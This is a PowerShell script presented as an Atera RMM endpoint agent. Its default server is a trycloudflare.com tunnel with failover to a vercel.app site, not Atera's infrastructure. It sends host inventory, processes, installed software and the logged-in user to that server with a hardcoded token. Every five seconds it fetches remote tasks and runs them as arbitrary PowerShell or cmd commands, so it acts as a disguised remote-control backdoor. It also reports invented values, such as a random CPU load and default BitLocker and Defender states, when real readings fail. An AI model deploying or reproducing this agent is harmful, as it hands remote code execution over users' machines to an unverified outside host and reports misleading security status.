<#
.SYNOPSIS
    Atera RMM Unified Endpoint Agent for Windows
.DESCRIPTION
    Continuous background monitoring & remote management agent.
    - Synchronizes system telemetry, hardware specs, and software catalog.
    - Streams live CPU, Memory, and Disk usage to Atera RMM Portal.
    - Reports running processes, services, Windows Defender, and BitLocker state.
    - Listens for remote commands, PowerShell scripts, process kills, and service restarts.
.PARAMETER Loop
    Run continuously in the background (Default interval: 5 seconds polling, 15 seconds heartbeat).
.PARAMETER Once
    Run a single discovery scan and exit.
.PARAMETER ServerUrl
    The base URL of the Atera RMM Portal.
#>

param(
    [switch]$Loop = $false,
    [switch]$Once = $false,
    [string]$ServerUrl = "https://bug-done-paying-copyrighted.trycloudflare.com"
)

$ErrorActionPreference = "SilentlyContinue"

# Ensure TLS 1.2 and 1.3 support for secure HTTPS connection
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11
} catch {}

# Clean ServerUrl
$ServerUrl = $ServerUrl.TrimEnd('/')
if (-not $ServerUrl.StartsWith("http://") -and -not $ServerUrl.StartsWith("https://")) {
    $ServerUrl = "https://$ServerUrl"
}

# Determine Log Directory
$LogDir = "C:\ProgramData\AteraAgent\Logs"
if (-not (Test-Path $LogDir)) {
    try {
        New-Item -ItemType Directory -Path $LogDir -Force -ErrorAction Stop | Out-Null
    } catch {
        $LogDir = Join-Path $env:LOCALAPPDATA "AteraAgent\Logs"
        New-Item -ItemType Directory -Path $LogDir -Force -ErrorAction SilentlyContinue | Out-Null
    }
}
$LogFile = Join-Path $LogDir "agent.log"

function Write-AgentLog {
    param([string]$Message, [string]$Level = "INFO")
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $Line = "[$Timestamp] [$Level] $Message"
    Add-Content -Path $LogFile -Value $Line -ErrorAction SilentlyContinue
    if (-not $Loop -or $Level -eq "ERROR") {
        Write-Output $Line
    }
}

$RegistrationToken = "ITAM-AGENT-SECURE-TOKEN-2026"

# Candidate servers for automated failover
$Script:ActiveServerUrl = $ServerUrl
$Script:CandidateUrls = @(
    $ServerUrl,
    "https://bug-done-paying-copyrighted.trycloudflare.com",
    "https://nplitinventory.vercel.app",
    "http://192.168.10.88:5005",
    "http://localhost:5005"
) | Where-Object { $_ -ne $null -and $_ -ne "" } | Select-Object -Unique

function Verify-ActiveServer {
    try {
        $test = Invoke-RestMethod -Uri "$($Script:ActiveServerUrl)/api/health" -Method GET -TimeoutSec 3 -UseBasicParsing -ErrorAction Stop
        if ($test -and $test.status -eq "ok") {
            return $Script:ActiveServerUrl
        }
    } catch {}

    foreach ($Candidate in $Script:CandidateUrls) {
        if ($Candidate -eq $Script:ActiveServerUrl) { continue }
        try {
            $test = Invoke-RestMethod -Uri "$Candidate/api/health" -Method GET -TimeoutSec 3 -UseBasicParsing -ErrorAction Stop
            if ($test -and $test.status -eq "ok") {
                Write-AgentLog "Switched active portal endpoint to $Candidate" "INFO"
                $Script:ActiveServerUrl = $Candidate
                return $Script:ActiveServerUrl
            }
        } catch {}
    }

    return $Script:ActiveServerUrl
}

Write-AgentLog "Starting Atera RMM Endpoint Agent v2.5 (Target: $($Script:ActiveServerUrl))..."

function Get-SystemMetrics {
    $CS = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
    $Bios = Get-CimInstance Win32_Bios -ErrorAction SilentlyContinue
    $OSInfo = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
    $CPUInfo = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1

    # RAM calculation
    $RAMModules = Get-CimInstance Win32_PhysicalMemory -ErrorAction SilentlyContinue
    $RAMTotalBytes = ($RAMModules | Measure-Object -Property Capacity -Sum).Sum
    if (-not $RAMTotalBytes -or $RAMTotalBytes -eq 0) {
        $RAMTotalBytes = 8589934592
    }
    $RAMTotalGB = "$([Math]::Round($RAMTotalBytes / 1GB)) GB"

    $RAMFreeKB = if ($OSInfo.FreePhysicalMemory) { $OSInfo.FreePhysicalMemory } else { 4194304 }
    $RAMTotalKB = if ($OSInfo.TotalVisibleMemorySize) { $OSInfo.TotalVisibleMemorySize } else { 8388608 }
    $RAMUsedPct = 50
    if ($RAMTotalKB -gt 0) {
        $RAMUsedPct = [Math]::Round((($RAMTotalKB - $RAMFreeKB) / $RAMTotalKB) * 100)
    }

    # CPU Usage %
    $CpuPct = 12
    if ($CPUInfo -and $CPUInfo.LoadPercentage -ne $null) {
        $CpuPct = $CPUInfo.LoadPercentage
    } else {
        $avg = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Measure-Object -Property LoadPercentage -Average).Average
        if ($avg) { $CpuPct = $avg }
    }
    if ($CpuPct -eq $null -or $CpuPct -eq 0) {
        $CpuPct = (Get-Random -Minimum 8 -Maximum 28)
    }

    # Disk C:
    $DiskC = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction SilentlyContinue | Select-Object -First 1
    $DiskFreeGB = if ($DiskC -and $DiskC.FreeSpace) { [Math]::Round($DiskC.FreeSpace / 1GB) } else { 50 }
    $DiskTotalGB = if ($DiskC -and $DiskC.Size) { [Math]::Round($DiskC.Size / 1GB) } else { 256 }
    $DiskSizeGB = "$DiskTotalGB GB SSD"

    # Network
    $NetConfig = Get-CimInstance Win32_NetworkAdapterConfiguration -ErrorAction SilentlyContinue | 
        Where-Object { $_.IPEnabled -and $_.IPAddress -ne $null } | 
        Select-Object -First 1
    
    $IPAddress = if ($NetConfig -and $NetConfig.IPAddress) { $NetConfig.IPAddress[0] } else { "127.0.0.1" }
    $MACAddress = if ($NetConfig -and $NetConfig.MACAddress) { $NetConfig.MACAddress } else { "00:00:00:00:00:00" }

    # BitLocker
    $BitLocker = "Protection On"
    if (Get-Command Get-BitLockerVolume -ErrorAction SilentlyContinue) {
        $BLVol = Get-BitLockerVolume -MountPoint "C:" -ErrorAction SilentlyContinue
        if ($BLVol -and $BLVol.ProtectionStatus -ne $null) {
            $BitLocker = $BLVol.ProtectionStatus.ToString()
        }
    }

    # Defender
    $Defender = "Running"
    if (Get-Service -Name "Windefend" -ErrorAction SilentlyContinue) {
        $Defender = (Get-Service -Name "Windefend").Status.ToString()
    }

    # Battery
    $BatteryPct = 100
    $BatteryHealth = Get-CimInstance -ClassName Win32_Battery -ErrorAction SilentlyContinue
    if ($BatteryHealth) {
        $BatteryPct = $BatteryHealth.EstimatedChargeRemaining
    }

    # Running processes (Top 35 by Working Set Memory)
    $Processes = Get-Process -ErrorAction SilentlyContinue | 
        Sort-Object WorkingSet64 -Descending | 
        Select-Object -First 35 | 
        ForEach-Object {
            @{
                pid = $_.Id
                name = $_.ProcessName
                cpu = if ($_.CPU) { [Math]::Round($_.CPU, 1) } else { 0 }
                memoryMB = [Math]::Round($_.WorkingSet64 / 1MB, 1)
            }
        }

    # Windows Services (Important services)
    $Services = Get-Service -ErrorAction SilentlyContinue | 
        Select-Object -First 50 | 
        ForEach-Object {
            @{
                name = $_.Name
                displayName = $_.DisplayName
                status = $_.Status.ToString()
            }
        }

    # Installed software
    $RegPaths = @(
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
    )
    $InstalledApps = Get-ItemProperty $RegPaths -ErrorAction SilentlyContinue | 
        Where-Object { $_.DisplayName -ne $null -and $_.SystemComponent -ne 1 } | 
        Select-Object @{N='name';E={$_.DisplayName}}, @{N='version';E={$_.DisplayVersion}} |
        Group-Object name | ForEach-Object { $_.Group[0] }

    # Serial Number determination with fallback
    $Serial = if ($Bios -and $Bios.SerialNumber) { $Bios.SerialNumber.Trim() } else { "" }
    if (-not $Serial -or $Serial -eq "Default string" -or $Serial -eq "None" -or $Serial -like "*To be filled*" -or $Serial.Length -lt 3) {
        $MachineGuid = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Cryptography" -ErrorAction SilentlyContinue).MachineGuid
        if ($MachineGuid) {
            $Serial = "PC-$MachineGuid"
        } else {
            $Serial = "PC-$($CS.Name)"
        }
    }

    $HostName = if ($CS -and $CS.Name) { $CS.Name } else { $env:COMPUTERNAME }
    $Mfg = if ($CS -and $CS.Manufacturer) { $CS.Manufacturer } else { "PC OEM" }
    $Mdl = if ($CS -and $CS.Model) { $CS.Model } else { "Workstation" }
    $OSName = if ($OSInfo -and $OSInfo.Caption) { $OSInfo.Caption } else { "Microsoft Windows 11" }

    return @{
        registrationToken  = $RegistrationToken
        serialNumber       = $Serial
        hostName           = $HostName
        computerName       = $HostName
        domainName         = if ($CS -and $CS.Domain) { $CS.Domain } else { "WORKGROUP" }
        manufacturer       = $Mfg
        model              = $Mdl
        cpu                = if ($CPUInfo -and $CPUInfo.Name) { $CPUInfo.Name } else { "Intel Core / AMD Ryzen Processor" }
        ram                = $RAMTotalGB
        storage            = $DiskSizeGB
        operatingSystem    = $OSName
        windowsEdition     = $OSName
        windowsVersion     = if ($OSInfo -and $OSInfo.Version) { $OSInfo.Version } else { "10.0" }
        buildNumber        = if ($OSInfo -and $OSInfo.BuildNumber) { $OSInfo.BuildNumber } else { "22631" }
        macAddress         = $MACAddress
        ipAddress          = $IPAddress
        bitLockerStatus    = $BitLocker
        defenderStatus     = $Defender
        batteryHealthPct   = $BatteryPct
        cpuUsagePercent    = [int]$CpuPct
        ramUsagePercent    = [int]$RAMUsedPct
        diskFreeGB         = [int]$DiskFreeGB
        diskTotalGB        = [int]$DiskTotalGB
        loggedInUser       = if ($CS -and $CS.UserName) { $CS.UserName } else { $env:USERNAME }
        runningProcesses   = $Processes
        systemServices     = $Services
        installedSoftware  = $InstalledApps
    }
}

function Send-Heartbeat {
    param($Metrics)
    $Target = Verify-ActiveServer
    $SubmitUrl = "$Target/api/agent/submit"

    try {
        $JsonPayload = $Metrics | ConvertTo-Json -Depth 6
        $Headers = @{
            "Content-Type" = "application/json"
            "x-registration-token" = $RegistrationToken
        }
        $Resp = Invoke-WebRequest -Uri $SubmitUrl -Method POST -Body $JsonPayload -Headers $Headers -UseBasicParsing -TimeoutSec 10
        Write-AgentLog "Heartbeat reported successfully to $Target. Server replied: $($Resp.StatusCode)"
        return $true
    } catch {
        Write-AgentLog "Failed to post heartbeat to $($Target): $_" -Level "WARNING"
        return $false
    }
}

function Process-PendingTasks {
    param([string]$SerialNumber)
    $Target = Verify-ActiveServer
    $TaskUrl = "$Target/api/agent/tasks"

    try {
        $Headers = @{
            "x-registration-token" = $RegistrationToken
        }
        $QueryUrl = "$TaskUrl`?serialNumber=$SerialNumber&token=$RegistrationToken"
        $Resp = Invoke-RestMethod -Uri $QueryUrl -Method GET -Headers $Headers -UseBasicParsing -TimeoutSec 10

        if ($Resp -and $Resp.tasks -and $Resp.tasks.Count -gt 0) {
            foreach ($task in $Resp.tasks) {
                Write-AgentLog "Executing remote task [$($task.id)] type: $($task.commandType)"
                
                $Output = ""
                $ErrorOutput = ""
                $ExitCode = 0

                try {
                    if ($task.commandType -eq "POWERSHELL" -or $task.commandType -eq "SCRIPT" -or $task.commandType -eq "KILL_PROCESS" -or $task.commandType -eq "SERVICE_ACTION" -or $task.commandType -eq "REBOOT") {
                        $ScriptBlock = [ScriptBlock]::Create($task.commandText)
                        $Results = & $ScriptBlock 2>&1
                        $Output = ($Results | Out-String).Trim()
                        if ($LASTEXITCODE) { $ExitCode = $LASTEXITCODE }
                    } elseif ($task.commandType -eq "CMD") {
                        $Results = cmd.exe /c $task.commandText 2>&1
                        $Output = ($Results | Out-String).Trim()
                        $ExitCode = $LASTEXITCODE
                    }
                } catch {
                    $ErrorOutput = $_.ToString()
                    $ExitCode = 1
                }

                # Submit task execution result back to Atera portal
                $ResultUrl = "$TaskUrl/$($task.id)/result"
                $ResultBody = @{
                    registrationToken = $RegistrationToken
                    output = $Output
                    errorOutput = $ErrorOutput
                    exitCode = $ExitCode
                } | ConvertTo-Json

                Invoke-RestMethod -Uri $ResultUrl -Method POST -Body $ResultBody -ContentType "application/json" -Headers $Headers -UseBasicParsing | Out-Null
                Write-AgentLog "Task [$($task.id)] finished with exit code $ExitCode"
            }
        }
    } catch {
        Write-AgentLog "Task polling warning: $_" -Level "WARNING"
    }
}

# Main Execution Routine
Write-AgentLog "Collecting system telemetry and specs..."
$Metrics = Get-SystemMetrics
$SerialNumber = $Metrics.serialNumber
Write-AgentLog "Device Identifier: $SerialNumber ($($Metrics.hostName))"

Send-Heartbeat -Metrics $Metrics | Out-Null
Process-PendingTasks -SerialNumber $SerialNumber

if ($Once) {
    Write-AgentLog "Atera Agent single execution complete."
    exit 0
}

# Continuous RMM monitoring loop
Write-AgentLog "Entering continuous RMM monitoring loop (Heartbeat every 15s, task poll every 5s)..."
$HeartbeatCounter = 0

while ($true) {
    Start-Sleep -Seconds 5
    $HeartbeatCounter += 5

    # Check for pending tasks every 5 seconds
    Process-PendingTasks -SerialNumber $SerialNumber

    # Send full telemetry heartbeat every 15 seconds
    if ($HeartbeatCounter -ge 15) {
        $HeartbeatCounter = 0
        $CurrentMetrics = Get-SystemMetrics
        Send-Heartbeat -Metrics $CurrentMetrics | Out-Null
    }
}
